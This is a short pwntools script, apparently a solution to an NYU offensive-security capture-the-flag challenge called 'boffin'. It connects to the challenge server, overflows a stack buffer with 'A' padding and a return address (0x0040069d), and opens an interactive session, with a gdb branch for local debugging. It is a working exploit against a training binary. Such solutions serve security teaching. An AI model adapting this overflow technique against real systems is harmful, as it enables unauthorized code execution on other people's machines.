from pwn import *
context(arch = 'amd64', os = 'linux')

local = False

if not local:
    r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1337)
    r.send('bh1642\r\n')
    r.recvline() # Wait

if local:
    r = process('./boffin')
    gdb.attach(r, '''
    set follow-fork-mode child
    break *(main+40)
    break *(main+62)
    continue
    ''')

r.send(p64(0x0040069d).rjust(0x30, 'A') + '\r\n')
r.interactive()
